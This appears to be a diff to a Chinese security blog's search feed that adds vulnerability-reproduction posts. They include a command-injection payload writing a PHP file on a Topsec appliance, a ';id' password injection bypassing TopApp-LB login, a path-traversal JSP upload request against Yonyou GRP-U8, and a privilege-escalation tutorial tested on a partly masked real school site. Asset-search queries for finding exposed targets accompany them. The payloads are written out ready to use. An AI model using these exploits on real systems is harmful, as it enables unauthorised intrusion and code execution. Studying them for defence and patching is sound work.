@@ -4,6 +4,106 @@
   
   
   <entry>
+    <title>“天融信-上网行为管理系统任意文件写入“</title>
+    <link href="/2024/06/18/%E2%80%9C%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E2%80%9C/"/>
+    <url>/2024/06/18/%E2%80%9C%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E2%80%9C/</url>
+    
+    <content type="html"><![CDATA[<h1 id="资产查询"><a href="#资产查询" class="headerlink" title="资产查询"></a>资产查询</h1><p>测绘语句:app&#x3D;“天融信-上网行为管理系统”</p><p><img src="/2024/06/18/%E2%80%9C%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E2%80%9C/image-20240618112008685.png" alt="image-20240618112008685"></p><h1 id="首页"><a href="#首页" class="headerlink" title="首页:"></a>首页:</h1><p><img src="/2024/06/18/%E2%80%9C%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E2%80%9C/image-20240618112015416.png" alt="image-20240618112015416"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">poc:</span><br>/view/IPV<span class="hljs-number">6</span>/naborTable/static_convert.php?blocks[<span class="hljs-number">0</span>]<span class="hljs-operator">=</span>||<span class="hljs-variable">%20</span><br>echo<span class="hljs-variable">%20</span>PD<span class="hljs-number">9</span>waHAgcGhwaW<span class="hljs-number">5</span>mbygpOz<span class="hljs-number">8</span>+<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>Cbase<span class="hljs-number">64</span><span class="hljs-variable">%20</span>-<br>d<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%20</span>/var/www/html/<span class="hljs-number">1</span>.php<span class="hljs-variable">%0</span>a<br><br>拼接路径访问即可，它会把<span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>写到/var/www/html/<span class="hljs-number">1</span>.php中<br></code></pre></td></tr></table></figure><p><img src="/2024/06/18/%E2%80%9C%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E2%80%9C/image-20240618112033933.png" alt="image-20240618112033933"></p><p><img src="/2024/06/18/%E2%80%9C%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E2%80%9C/image-20240618112041237.png" alt="image-20240618112041237"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>漏洞</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>漏洞复现</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>天融信 TopApp-LB 登陆绕过漏洞</title>
+    <link href="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h1 id="资产测绘"><a href="#资产测绘" class="headerlink" title="资产测绘:"></a>资产测绘:</h1><p>title&#x3D;“TopApp-LB 负载均衡系统”</p><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/image-20240618111811434.png" alt="image-20240618111811434"></p><h1 id="首页"><a href="#首页" class="headerlink" title="首页:"></a>首页:</h1><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/image-20240618111820823.png" alt="image-20240618111820823"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现:"></a>漏洞复现:</h1><p>账号任意输，密码: ;id</p><p>比如: 账号:aaa 密码: ;id</p><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/image-20240618111834320.png" alt="image-20240618111834320"></p><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/image-20240618111841674.png" alt="image-20240618111841674"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>漏洞</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>漏洞复现</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>用友GPR漏洞复现</title>
+    <link href="/2024/06/18/%E7%94%A8%E5%8F%8BGPR%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    <url>/2024/06/18/%E7%94%A8%E5%8F%8BGPR%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    
+    <content type="html"><![CDATA[<h1 id="测绘-hunter"><a href="#测绘-hunter" class="headerlink" title="测绘(hunter)"></a>测绘(hunter)</h1><p>app.name&#x3D;“用友GRP-U8 OA”</p><p><img src="/2024/06/18/%E7%94%A8%E5%8F%8BGPR%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240618111534110.png" alt="image-20240618111534110"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/UploadFileData?action=upload_file&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;foldername=%2e%2e%2f&amp;filename=test.jsp&amp;filename=1.jpg</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>XXX.XXX.XXX:99<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------192386535332116664783811905534<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>263<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------192386535332116664783811905534</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;myFile&quot;; filename=&quot;1.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/x-php</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;%<span class="hljs-keyword">out</span>.print(&quot;test vulnerability!&quot;);%&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------192386535332116664783811905534--</span></span><br></code></pre></td></tr></table></figure><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p><img src="/2024/06/18/%E7%94%A8%E5%8F%8BGPR%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240618111631898.png" alt="image-20240618111631898"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>漏洞</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>漏洞复现</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>渗透-越权</title>
+    <link href="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/"/>
+    <url>/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/</url>
+    
+    <content type="html"><![CDATA[<h1 id="1、什么是越权？"><a href="#1、什么是越权？" class="headerlink" title="1、什么是越权？"></a>1、什么是越权？</h1><p>越权漏洞是Web应用程序中一种常见的安全漏洞。它的威胁在于一个账户即可控制全站用户数据。</p><p>越权漏洞的成因主要是因为开发人员在对数据进行<strong>增、删、改、查询</strong>时对客户端请求的数据过分相信而遗漏了权限的判定。而且属于逻辑漏洞的一种，防护和检测都不好做。</p><h1 id="2、越权的分类："><a href="#2、越权的分类：" class="headerlink" title="2、越权的分类："></a>2、越权的分类：</h1><p><strong>1.水平越权</strong>：这种类型的越权就是越权其他用户，比如说你要查看一篇邮件，但是存在越权漏洞，却可以查看其他人的邮件。水平越权导致任意用户敏感信息泄露或者用户信息被恶意修改。</p><p><strong>2.垂直越权</strong>：这种类型的越权就是可以在<strong>不同身份之间越权</strong>，比如你是普通用户，但是可以越权到管理员，甚至超级管理员。这样就可以利用管理员或者超级管理员的功能。</p><p><strong>3.上下文越权</strong>：上下文越权就是说在某个程序需要执行n个步骤，而你却可以跳过其中某个步骤，直接到最后的步骤。</p><h1 id="3、在哪里容易发生越权？"><a href="#3、在哪里容易发生越权？" class="headerlink" title="3、在哪里容易发生越权？"></a>3、在哪里容易发生越权？</h1><p><strong>1.基础参数</strong>：通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 <strong>id</strong> 便可查看，当修改为他人的id号时会返回他人的信息。<strong>再比如cookie中的参数就作为用户的凭据，修改这个凭据便可以其他用户身份通过验证。</strong></p><p><strong>2.多阶段验证</strong>：多阶段功能是一个功能有多个阶段的实现。例如修改密码，可能第一步是验证用户身份信息，号码验证码类的。当验证成功后，跳到第二步，输入新密码，<strong>很多程序会在这一步不再验证用户身份</strong>，导致恶意攻击者抓包直接修改参数值，导致可修改任意用户密码。</p><p><strong>3.基于参数的访问控制</strong>：有的程序会在参数里面进行权限认证。如：<a href="http://www.aaaa.com/name=test&admin=0">www.aaaa.com/name=test&amp;admin=0</a> ，把0改为1就有了admin权限。</p><p><strong>4.链接隐藏</strong>：有的程序会把页面独立，让爬虫爬取不到，但是可以使用扫目录的方式扫到url，如果此时页面不做权限认证，就可直接访问到功能点，或者只是前端跳转，<strong>可以使用burp抓回包，然后删除js代码绕过。</strong></p><p><strong>5.越权可能存在的地方</strong>：<strong>增、删、改、查、详情、导出</strong>等功能，当有这些功能的时候提高重视，在url、post data、cookie处寻找是否有鉴权参数最关键的点就是定位鉴权参数，<strong>然后替换为其他账户鉴权参数的方法来发现越权漏洞。</strong></p><h1 id="4、如何挖掘越权漏洞："><a href="#4、如何挖掘越权漏洞：" class="headerlink" title="4、如何挖掘越权漏洞："></a>4、如何挖掘越权漏洞：</h1><p>测试水平越权漏洞一般要<strong>控制2个账号</strong>，来互相探测能否影响到对方数据，一般是使用2个浏览器，分别使用2个账号登陆，<strong>在各个功能点修改参数（get、post、cookie）观察是否会影响到另一个账号的数据。</strong> 测试垂直越权一般看是否补通过认证即可访问管理页面，或是找是否有一个参数表示身份权限是否是管理员。</p><h1 id="5、实例"><a href="#5、实例" class="headerlink" title="5、实例"></a>5、实例</h1><p>（注：实例中的目标站点漏洞修复或站点已经关闭）</p><h2 id="xx师范学院校园资讯平台存在越权漏洞："><a href="#xx师范学院校园资讯平台存在越权漏洞：" class="headerlink" title="xx师范学院校园资讯平台存在越权漏洞："></a>xx师范学院校园资讯平台存在越权漏洞：</h2><p>URL：<a href="https://175.24.xx.xx/login/">https://175.24.xx.xx/login/</a></p><p>这里注册一个账号，然后登陆</p><p>15xxxx12&#x2F;test123</p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110407431.png" alt="image-20240618110407431"></p><p>登录进来后点击上方的个人信息，进入个人信息页面，查看http包，发现，cookie中存在id参数，并且参数等于某个数值</p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110444508.png" alt="image-20240618110444508"></p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110602425.png" alt="image-20240618110602425"></p><p>尝试使用其他人的id，这里，点进其中一个人主页，URL中存在用户的id</p><p>抓包，然后将cookie的id改成51</p><p>成功越权访问他人主页</p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110541980.png" alt="image-20240618110541980"></p><p>越权成功</p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110618776.png" alt="image-20240618110618776"></p><p>评论，也是更改其他用户id，发送，使用他人身份发送成功</p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110638016.png" alt="image-20240618110638016"></p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110651476.png" alt="image-20240618110651476"></p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110658451.png" alt="image-20240618110658451"></p><h1 id="6、越权的防护："><a href="#6、越权的防护：" class="headerlink" title="6、越权的防护："></a>6、越权的防护：</h1><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>.不能只根据用户 id 参数去搜索，应该再次进行身份验证（防止水平越权）。<br><span class="hljs-number">2</span>.可以从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。或在 session、cookie 中加入不可预测、不可猜解的 <span class="hljs-keyword">user</span> <span class="hljs-title">信息。</span><br><span class="hljs-title">3</span>.在每个页面加载前进行权限认证（防止垂直越权）。<br><span class="hljs-number">4</span>.对有多步验证的应用，需要准确验证上一步是否通过。<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透基础</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>越权</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>渗透-信息收集（三）</title>
     <link href="/2024/06/18/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%89%EF%BC%89/"/>
     <url>/2024/06/18/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%89%EF%BC%89/</url>
@@ -13,7 +113,7 @@
     
     <categories>
       
-      <category>信息收集</category>
+      <category>渗透基础</category>
       
     </categories>
     
@@ -38,7 +138,7 @@
     
     <categories>
       
-      <category>信息收集</category>
+      <category>渗透基础</category>
       
     </categories>
     
@@ -63,7 +163,7 @@
     
     <categories>
       
-      <category>信息收集</category>
+      <category>渗透基础</category>
       
     </categories>
     
